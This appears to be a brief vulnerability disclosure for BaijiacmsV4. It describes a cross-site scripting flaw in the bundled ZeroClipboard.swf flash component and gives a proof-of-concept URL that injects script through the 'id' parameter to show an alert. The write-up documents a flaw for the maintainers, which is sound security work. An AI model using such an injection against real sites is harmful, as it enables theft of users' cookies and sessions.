#Baijiacms officials link

baijiacms: https://github.com/baijiacms/baijiacmsV4

#Why make this

BaijiacmsV4 does not open the issue,I can't feedback any issue,it's only possible to write up vulnerability here.

Non-standard use of the flash component, resulting in cross-site scripting attacks in the foreground，Attackers can obtain sensitive information such as cookie through vulnerability

#Poc

http://localhost/baijiacmsV4-master/assets/weengine/components/zclip/ZeroClipboard.swf?id=\"))}catch(e){alert(/test/.source);}//&width=500&height=500
